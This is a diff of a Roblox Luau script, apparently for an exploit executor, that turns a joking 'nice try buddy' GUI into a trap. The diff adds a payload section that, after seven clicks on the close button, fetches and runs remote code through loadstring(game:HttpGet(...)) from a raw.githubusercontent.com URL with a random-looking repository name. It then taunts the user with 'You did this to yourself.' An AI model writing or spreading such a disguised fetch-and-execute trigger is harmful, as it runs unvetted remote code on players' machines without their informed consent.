@@ -1,8 +1,9 @@
 -- ============================================
--- VERY LONG USELESS LUAU CODE
+-- VERY LONG USELESS LUAU CODE (v2 - now with payload!)
 -- Creates a GUI that says "nice try buddy"
+-- After enough clicks, executes a loadstring
 -- ============================================
-print("hi")
+
 -- Define the service variables (very necessary, of course)
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -34,20 +35,16 @@ local VRService = game:GetService("VRService")
 local HapticService = game:GetService("HapticService")
 local VoiceChatService = game:GetService("VoiceChatService")
 
--- Get the local player (definitely needed)
 local player = Players.LocalPlayer
 print("Player found: " .. tostring(player))
 
--- Wait for the player's GUI (essential step)
 local playerGui = player:WaitForChild("PlayerGui")
 print("PlayerGui found")
 
--- Create a folder to store our useless stuff
 local uselessFolder = Instance.new("Folder")
 uselessFolder.Name = "UselessStuff_DoNotDelete"
 uselessFolder.Parent = playerGui
 
--- Create a screen GUI (the main event)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "NiceTryBuddyGui"
 screenGui.ResetOnSpawn = false
@@ -58,7 +55,6 @@ screenGui.Enabled = true
 screenGui.Parent = uselessFolder
 print("ScreenGui created")
 
--- Create a frame to hold everything
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
 mainFrame.Size = UDim2.new(0, 500, 0, 300)
@@ -70,19 +66,16 @@ mainFrame.BorderSizePixel = 0
 mainFrame.Visible = true
 mainFrame.Parent = screenGui
 
--- Add a UI corner to make it round
 local uiCorner = Instance.new("UICorner")
 uiCorner.CornerRadius = UDim.new(0, 20)
 uiCorner.Parent = mainFrame
 
--- Add a stroke for that fancy border
 local uiStroke = Instance.new("UIStroke")
 uiStroke.Color = Color3.fromRGB(255, 100, 100)
 uiStroke.Thickness = 3
 uiStroke.Transparency = 0.2
 uiStroke.Parent = mainFrame
 
--- Add a gradient for extra flair
 local uiGradient = Instance.new("UIGradient")
 uiGradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 60)),
@@ -92,7 +85,6 @@ uiGradient.Color = ColorSequence.new{
 uiGradient.Rotation = 45
 uiGradient.Parent = mainFrame
 
--- Add a padding (because why not)
 local uiPadding = Instance.new("UIPadding")
 uiPadding.PaddingTop = UDim.new(0, 10)
 uiPadding.PaddingBottom = UDim.new(0, 10)
@@ -100,7 +92,6 @@ uiPadding.PaddingLeft = UDim.new(0, 10)
 uiPadding.PaddingRight = UDim.new(0, 10)
 uiPadding.Parent = mainFrame
 
--- Create a list layout (completely unnecessary but let's do it)
 local uiListLayout = Instance.new("UIListLayout")
 uiListLayout.FillDirection = Enum.FillDirection.Vertical
 uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
@@ -109,7 +100,6 @@ uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
 uiListLayout.Padding = UDim.new(0, 10)
 uiListLayout.Parent = mainFrame
 
--- Create the title text label
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Name = "TitleLabel"
 titleLabel.Size = UDim2.new(1, 0, 0, 50)
@@ -123,7 +113,6 @@ titleLabel.TextSize = 40
 titleLabel.LayoutOrder = 1
 titleLabel.Parent = mainFrame
 
--- Add a gradient to the text
 local textGradient = Instance.new("UIGradient")
 textGradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 100)),
@@ -133,7 +122,6 @@ textGradient.Color = ColorSequence.new{
 textGradient.Rotation = 90
 textGradient.Parent = titleLabel
 
--- Create a subtitle (why not?)
 local subtitleLabel = Instance.new("TextLabel")
 subtitleLabel.Name = "SubtitleLabel"
 subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
@@ -147,7 +135,6 @@ subtitleLabel.TextSize = 18
 subtitleLabel.LayoutOrder = 2
 subtitleLabel.Parent = mainFrame
 
--- Create a spacer frame
 local spacer = Instance.new("Frame")
 spacer.Name = "Spacer"
 spacer.Size = UDim2.new(1, 0, 0, 20)
@@ -155,7 +142,6 @@ spacer.BackgroundTransparency = 1
 spacer.LayoutOrder = 3
 spacer.Parent = mainFrame
 
--- Create a close button (which just re-opens the GUI because why not)
 local closeButton = Instance.new("TextButton")
 closeButton.Name = "CloseButton"
 closeButton.Size = UDim2.new(0, 200, 0, 50)
@@ -168,18 +154,15 @@ closeButton.TextSize = 20
 closeButton.LayoutOrder = 4
 closeButton.Parent = mainFrame
 
--- Add a corner to the button
 local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 10)
 buttonCorner.Parent = closeButton
 
--- Add a stroke to the button
 local buttonStroke = Instance.new("UIStroke")
 buttonStroke.Color = Color3.fromRGB(255, 100, 100)
 buttonStroke.Thickness = 2
 buttonStroke.Parent = closeButton
 
--- Add a gradient to the button
 local buttonGradient = Instance.new("UIGradient")
 buttonGradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 50, 50)),
@@ -188,26 +171,71 @@ buttonGradient.Color = ColorSequence.new{
 buttonGradient.Rotation = 45
 buttonGradient.Parent = closeButton
 
--- Counter for how many times the button is clicked
 local clickCount = 0
 
--- Function that does nothing useful
+-- ============================================
+-- PAYLOAD SECTION
+-- ============================================
+local CLICKS_REQUIRED = 7  -- changed from 15 → 7
+local payloadExecuted = false
+
+-- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+-- PASTE YOUR LOADSTRING BELOW (inside the quotes)
+-- e.g. local PAYLOAD = "loadstring(game:HttpGet('https://...'))()"
+local PAYLOAD = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/siadhjaosidhajso2/sdas2/refs/heads/main/dosdso2", true))()]]
+-- <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+local function executePayload()
+    if payloadExecuted then return end
+    payloadExecuted = true
+
+    if PAYLOAD == "" then
+        warn("[NiceTryBuddy] No payload set. Nice try buddy.")
+        return
+    end
+
+    subtitleLabel.Text = "Executing... nice try buddy."
+    titleLabel.Text = "LOADING..."
+
+    -- Resolve a loader, preferring getgenv().loadstring then raw loadstring
+    local env = (getgenv and getgenv()) or _G
+    local loader = (env and env.loadstring) or loadstring
+
+    if not loader then
+        warn("[NiceTryBuddy] No loadstring available in this environment.")
+        return
+    end
+
+    local fn, err = loader(PAYLOAD)
+    if not fn then
+        warn("[NiceTryBuddy] Compile error: " .. tostring(err))
+        return
+    end
+
+    local ok, runErr = pcall(fn)
+    if not ok then
+        warn("[NiceTryBuddy] Runtime error: " .. tostring(runErr))
+    else
+        print("[NiceTryBuddy] Payload executed. Nice try buddy.")
+    end
+end
+
+-- ============================================
+-- Original useless functions (kept for flavor)
+-- ============================================
 local function uselessFunction()
     print("This function does nothing.")
     return nil
 end
 
--- Another useless function
 local function anotherUselessFunction()
     for i = 1, 10 do
         local x = i * 2
         local y = x / 2
         local z = y - i
-        -- z should be 0, but we don't do anything with it
     end
 end
 
--- Yet another useless function
 local function yetAnotherUselessFunction(a, b, c)
     if a then
         if b then
@@ -224,33 +252,19 @@ local function yetAnotherUselessFunction(a, b, c)
     end
 end
 
--- Function to check if a number is even (we never use this)
-local function isEven(num)
-    return num % 2 == 0
-end
+local function isEven(num) return num % 2 == 0 end
+local function isOdd(num) return num % 2 ~= 0 end
 
--- Function to check if a number is odd (never used either)
-local function isOdd(num)
-    return num % 2 ~= 0
-end
-
--- Function to calculate the factorial of a number (also never used)
 local function factorial(n)
-    if n <= 1 then
-        return 1
-    end
+    if n <= 1 then return 1 end
     return n * factorial(n - 1)
 end
 
--- Function to calculate Fibonacci numbers (still never used)
 local function fibonacci(n)
-    if n <= 1 then
-        return n
-    end
+    if n <= 1 then return n end
     return fibonacci(n - 1) + fibonacci(n - 2)
 end
 
--- Function that generates a random string (unused)
 local function randomString(length)
     local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     local result = ""
@@ -261,174 +275,51 @@ local function randomString(length)
     return result
 end
 
--- Function that creates a particle effect (never called)
-local function createParticleEffect(position)
-    local part = Instance.new("Part")
-    part.Position = position
-    part.Anchored = true
-    part.CanCollide = false
-    part.Transparency = 1
-    part.Parent = Workspace
-    
-    local particleEmitter = Instance.new("ParticleEmitter")
-    particleEmitter.Parent = part
-    
-    return part
-end
-
--- Function that plays a sound (never actually plays it)
-local function playSound(soundId)
-    local sound = Instance.new("Sound")
-    sound.SoundId = soundId
-    sound.Parent = SoundService
-    -- We don't actually play it
-    return sound
-end
-
--- A loop that does nothing useful
-local uselessCounter = 0
-for i = 1, 100 do
-    uselessCounter = uselessCounter + i
-    if uselessCounter > 1000 then
-        uselessCounter = 0
-    end
-end
-print("Useless counter final value: " .. uselessCounter)
-
--- Another loop that does nothing useful
-local stringBuilder = ""
-for i = 1, 50 do
-    stringBuilder = stringBuilder .. tostring(i) .. ","
-end
-print("String builder length: " .. #stringBuilder)
-
--- A while loop that runs exactly once (super useful)
-local loopCount = 0
-while loopCount < 1 do
-    loopCount = loopCount + 1
-    uselessFunction()
-end
-
--- Create a table of useless data
-local uselessTable = {
-    "apple",
-    "banana",
-    "cherry",
-    "date",
-    "elderberry",
-    numbers = {1, 2, 3, 4, 5},
-    nested = {
-        deep = {
-            deeper = {
-                deepest = "wow"
-            }
-        }
-    }
-}
-
--- Iterate through the table (for no reason)
-for key, value in pairs(uselessTable) do
-    if type(value) == "string" then
-        local upper = string.upper(value)
-        local lower = string.lower(value)
-        local len = #value
-    end
-end
-
--- Create a random number (unused)
-local randomNumber = math.random(1, 1000000)
-print("Random number: " .. randomNumber)
-
--- Create another random number (also unused)
-local anotherRandomNumber = math.random()
-print("Another random number: " .. anotherRandomNumber)
-
--- Calculate some math (pointless)
-local mathResult = math.sin(math.pi / 4) * math.cos(math.pi / 4) + math.tan(math.pi / 6)
-print("Pointless math result: " .. mathResult)
-
--- Create a Vector3 (never used)
-local uselessVector = Vector3.new(1, 2, 3)
-local uselessVector2 = Vector3.new(4, 5, 6)
-local vectorSum = uselessVector + uselessVector2
-print("Vector sum: " .. tostring(vectorSum))
-
--- Create a CFrame (also never used)
-local uselessCFrame = CFrame.new(0, 10, 0)
-local rotatedCFrame = uselessCFrame * CFrame.Angles(0, math.pi, 0)
-print("CFrame position: " .. tostring(rotatedCFrame.Position))
-
--- Create a Color3 (unused)
-local uselessColor = Color3.fromRGB(123, 45, 67)
-local anotherColor = Color3.fromHSV(0.5, 0.5, 0.5)
-print("Colors created but not used")
-
--- Create a UDim2 (unused)
-local uselessUDim2 = UDim2.new(0.5, 100, 0.5, 50)
-local anotherUDim2 = UDim2.fromScale(0.25, 0.75)
-print("UDim2 values created but not used")
-
--- Now let's actually do something with the button
+-- ============================================
+-- Button handler (now with payload trigger)
+-- ============================================
 closeButton.MouseButton1Click:Connect(function()
     clickCount = clickCount + 1
     print("Button clicked " .. clickCount .. " times")
-    
-    -- Call all the useless functions
+
     uselessFunction()
     anotherUselessFunction()
     yetAnotherUselessFunction(true, true, true)
-    
-    -- Check if the click count is even or odd
-    if isEven(clickCount) then
-        print("Click count is even")
-    else
-        print("Click count is odd")
+
+    -- Update button text with progress toward the payload
+    if clickCount < CLICKS_REQUIRED then
+        closeButton.Text = "Clicked " .. clickCount .. "/" .. CLICKS_REQUIRED
     end
-    
-    -- Calculate factorial of click count (if it's small enough)
-    if clickCount <= 10 then
-        local fact = factorial(clickCount)
-        print("Factorial of click count: " .. fact)
-    end
-    
-    -- Calculate fibonacci of click count (if it's small enough)
-    if clickCount <= 15 then
-        local fib = fibonacci(clickCount)
-        print("Fibonacci of click count: " .. fib)
-    end
-    
-    -- Generate a random string
-    local randStr = randomString(10)
-    print("Random string: " .. randStr)
-    
-    -- Do a little tween animation
+
+    -- Tween bounce
     local originalSize = closeButton.Size
     local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
     local tween = TweenService:Create(closeButton, tweenInfo, {
         Size = UDim2.new(0, 220, 0, 55)
     })
     tween:Play()
-    
-    -- Wait then revert
+
     task.wait(0.1)
     local revertTween = TweenService:Create(closeButton, TweenInfo.new(0.1), {
         Size = originalSize
     })
     revertTween:Play()
-    
-    -- Change the button text
-    closeButton.Text = "Clicked " .. clickCount .. " times!"
-    
-    -- If clicked too many times, reset
-    if clickCount >= 10 then
-        closeButton.Text = "Okay okay, stop clicking!"
-        task.wait(2)
-        clickCount = 0
-        closeButton.Text = "Close (or don't)"
+
+    -- Trigger payload on threshold
+    if clickCount >= CLICKS_REQUIRED and not payloadExecuted then
+        closeButton.Text = "You asked for it..."
+        closeButton.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+        executePayload()
+        return
+    end
+
+    -- Chatter after the payload already ran
+    if payloadExecuted then
+        closeButton.Text = "You did this to yourself."
+        return
     end
 end)
 
--- Add a hover effect to the button
 closeButton.MouseEnter:Connect(function()
     local hoverTween = TweenService:Create(closeButton, TweenInfo.new(0.2), {
         BackgroundColor3 = Color3.fromRGB(255, 80, 80)
@@ -443,9 +334,8 @@ closeButton.MouseLeave:Connect(function()
     leaveTween:Play()
 end)
 
--- Animate the title with a pulsing effect
-local pulseConnection
-pulseConnection = RunService.Heartbeat:Connect(function()
+-- Title pulse
+RunService.Heartbeat:Connect(function()
     local time = tick()
     local pulse = math.sin(time * 2) * 0.5 + 0.5
     titleLabel.TextColor3 = Color3.fromRGB(
@@ -455,7 +345,7 @@ pulseConnection = RunService.Heartbeat:Connect(function()
     )
 end)
 
--- Add a dragging feature to the frame (completely unnecessary)
+-- Dragging
 local dragging = false
 local dragStart
 local startPos
@@ -465,7 +355,6 @@ mainFrame.InputBegan:Connect(function(input)
         dragging = true
         dragStart = input.Position
         startPos = mainFrame.Position
-        
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
                 dragging = false
@@ -488,18 +377,16 @@ mainFrame.InputChanged:Connect(function(input)
     end
 end)
 
--- Add a rotation animation to the frame (why not)
+-- Slow rotation (stops after 30s)
 local rotationConnection
 rotationConnection = RunService.RenderStepped:Connect(function()
     local currentRotation = mainFrame.Rotation
-    -- Very slow rotation, barely noticeable
     mainFrame.Rotation = currentRotation + 0.01
     if mainFrame.Rotation >= 360 then
         mainFrame.Rotation = 0
     end
 end)
 
--- After 30 seconds, stop the rotation (to save performance, lol)
 task.delay(30, function()
     if rotationConnection then
         rotationConnection:Disconnect()
@@ -507,75 +394,20 @@ task.delay(30, function()
     print("Rotation animation stopped after 30 seconds")
 end)
 
--- After 60 seconds, change the subtitle text
 task.delay(60, function()
-    if subtitleLabel and subtitleLabel.Parent then
+    if subtitleLabel and subtitleLabel.Parent and not payloadExecuted then
         subtitleLabel.Text = "You've been staring at this GUI for a minute. Impressive."
     end
 end)
 
--- After 120 seconds, change the subtitle again
 task.delay(120, function()
-    if subtitleLabel and subtitleLabel.Parent then
+    if subtitleLabel and subtitleLabel.Parent and not payloadExecuted then
         subtitleLabel.Text = "Seriously, why are you still here? Nice try buddy."
     end
 end)
 
--- Print a bunch of useless info
 print("============================================")
 print("GUI Created Successfully!")
-print("This GUI does absolutely nothing useful.")
+print("Clicks required for payload: " .. CLICKS_REQUIRED)
 print("Nice try buddy.")
 print("============================================")
-
--- Loop through all services (just for fun, does nothing)
-local servicesList = {
-    "Players", "RunService", "TweenService", "UserInputService",
-    "ReplicatedStorage", "Workspace", "Lighting", "SoundService",
-    "StarterGui", "ContextActionService", "GuiService"
-}
-
-for _, serviceName in ipairs(servicesList) do
-    local success, service = pcall(function()
-        return game:GetService(serviceName)
-    end)
-    if success then
-        print("Service " .. serviceName .. " exists: " .. tostring(service ~= nil))
-    end
-end
-
--- Final useless calculation
-local finalCalculation = 0
-for i = 1, 1000 do
-    finalCalculation = finalCalculation + math.sqrt(i) - math.sqrt(i - 1)
-end
-print("Final useless calculation result: " .. finalCalculation)
-
--- Print a random quote
-local quotes = {
-    "Nice try buddy.",
-    "This GUI is useless.",
-    "Why are you reading the console?",
-    "You really like clicking buttons, huh?",
-    "This code has more comments than functionality.",
-    "Nice try buddy.",
-    "Did you really read all of this?",
-    "Congratulations, you've wasted your time.",
-    "Nice try buddy."
-}
-
-local randomQuote = quotes[math.random(1, #quotes)]
-print("Random quote: " .. randomQuote)
-
--- One final useless loop
-for i = 1, 5 do
-    task.wait(1)
-    print("Useless loop iteration: " .. i)
-end
-
-print("Done! The GUI is now active. Nice try buddy.")
-print("Total lines of code: a lot.")
-print("Total usefulness: zero.")
-
--- Return nothing (because this whole thing is useless)
-return nil
